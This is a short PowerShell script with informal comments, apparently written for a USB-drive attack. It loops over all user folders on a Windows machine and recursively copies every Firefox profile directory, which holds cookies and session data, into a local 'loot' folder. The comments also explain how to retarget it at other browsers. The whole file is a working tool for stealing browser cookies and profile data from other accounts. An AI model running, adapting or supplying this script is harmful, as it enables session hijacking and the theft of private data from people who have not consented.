$iam = $env:USERNAME #not going to lie, I don't remember why I did this, but I'm pretty sure there was a good reason for it.
$currentdir = pwd #more or less establishing that it's being run from a USB drive
$userbase = gci C:\Users\ #this will read all the users located in the C:\ drive
$roamingcookiepath = "\AppData\Roaming\Mozilla\Firefox\Profiles" #setting up the variable for the files stored in Roaming. If memory serves me right, this is where the actual cookie file is stored
$localcookiepath = "\AppData\Local\Mozilla\Firefox\Profiles" #Again, if memory serves right, this is just fluff files for the cookies. This one and the previous variable setting can be used to tweak the script to retrieve other browsers
#and the actual script here:
foreach ($user in $userbase) {
    $roamingfullpath = Join-Path $user.FullName $roamingcookiepath #setting up everything, joining the user info to the roaming path
    $localfullpath = Join-Path $user.FullName $localcookiepath #same, but for local
    if (Test-Path $roamingfullpath) { #i don't remember why I named it Test-Path...but whatever, it works
        $roamingfullpath
        Copy-Item $roamingfullpath C:\users\student\Downloads\loot\$iam\roaming\ -Recurse #sucks up literally everything
    }
    if (Test-Path $localfullpath) {
        $localfullpath
        Copy-Item $localfullpath C:\users\student\Downloads\loot\$iam\local -Recurse
    }
}
